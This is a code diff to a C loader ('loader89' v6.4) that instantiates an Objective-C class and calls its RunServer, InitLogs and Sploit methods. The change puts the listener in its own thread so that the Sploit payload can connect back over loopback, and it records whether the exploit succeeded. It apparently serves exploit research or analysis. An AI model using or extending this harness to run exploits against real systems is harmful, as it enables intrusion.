@@ -711,6 +711,24 @@ static int read_child_status(void) {
     return g_exploit_sts.succeeded;
 }
 
+/* v6.4 fix D: dedicated RunServer worker. RunServer is a blocking accept
+ * loop that never returns, so it must live in its own detached thread.
+ * phase="runserver" is set here so the status file records that the
+ * listener thread was entered (the main flow overwrites the phase with
+ * "sploit" after the 1s settle delay). If RunServer ever DOES return
+ * (unexpected), we record runserver_done and persist the status file. */
+static void *runserver_thread_worker(void *arg) {
+    void *inst = arg;
+    set_exploit_phase("runserver");
+    log_info("RunServer thread before (blocking accept loop)");
+    p_msgSend(inst, p_sel("RunServer"));
+    /* only reached on an unexpected return from RunServer */
+    g_exploit_sts.runserver_done = 1;
+    write_child_status();
+    log_info("RunServer thread after (unexpected return)");
+    return 0;
+}
+
 static int exploit_class_main(void *acqCls, void *core) {
     if (!acqCls) return 2;
     /* v5.9 fix: ObjC metadata probe (v59_meta_probe.py) proved all 36 methods
@@ -721,6 +739,7 @@ static int exploit_class_main(void *acqCls, void *core) {
      * All three take no arguments (v16@0:8). */
     void *inst = p_msgSend(p_msgSend(acqCls, p_sel("alloc")), p_sel("init"));
     if (!inst) { log_error("AcqViewCntrlr_ alloc/init returned nil"); return 3; }
+    void *rs_thread = 0;   /* v6.4 fix D: detached RunServer listener thread */
     /* v6.2 fix C: MUST run before InitLogs. This is the convergence point of
      * the fork-child path and the thread path (see comment on
      * stub_core_net_sink); if the exploit is skipped, InitLogs never runs and
@@ -730,12 +749,25 @@ static int exploit_class_main(void *acqCls, void *core) {
     log_info("InitLogs before");
     p_msgSend(inst, p_sel("InitLogs"));
     log_info("InitLogs after");
-    set_exploit_phase("runserver");
-    log_info("RunServer before");
-    p_msgSend(inst, p_sel("RunServer"));
-    g_exploit_sts.runserver_done = 1;
-    g_exploit_sts.succeeded |= exploit_core_ok(core, &g_exploit_sts.raw_flag, &g_exploit_sts.core_base_resolved);
-    log_info("RunServer after");
+    /* v6.4 fix D: RunServer = blocking accept loop (never returns); run in
+     * detached pthread so Sploit can run. Payload needs listener up BEFORE
+     * Sploit runs (order critical). V63 confirmed RunServer binds
+     * 127.0.0.0:40000 then poll(fd,POLLIN,-1) forever, and Sploit@0x4694's
+     * payload connects back to 127.0.0.1:40000 (independent hardcoded port
+     * at 0x4710), so the listener MUST already be up when Sploit runs.
+     * Thread isolation also replaces the old fork-child containment: a
+     * crash inside RunServer (v4.2 saw an uncaught C++ exception from
+     * acceptor/bind/listen) kills only this thread's accept loop, not the
+     * whole process. C has no try/catch, so pthread isolation is the only
+     * containment available. Note: the phase field is written by this thread
+     * ("runserver") and then by the main flow ("sploit"); the write window
+     * is tiny and only affects diagnostic logging, not control flow. */
+    pthread_create(&rs_thread, 0, runserver_thread_worker, inst);
+    pthread_detach(rs_thread);
+    /* v6.4 fix D: give the RunServer thread a moment to bind+listen before
+     * Sploit runs; 1s is ample for a local loopback bind and keeps startup
+     * latency low. */
+    sleep(1);
     set_exploit_phase("sploit");
     log_info("Sploit before");
     p_msgSend(inst, p_sel("Sploit"));
@@ -1158,7 +1190,7 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v6.3 exploit-enabled start ===");
+    log_info("=== loader89 v6.4 runserver-thread start ===");
     read_runtime_config();
     {
         /* v5.8 problem C: child/worker exploit state goes to this file;
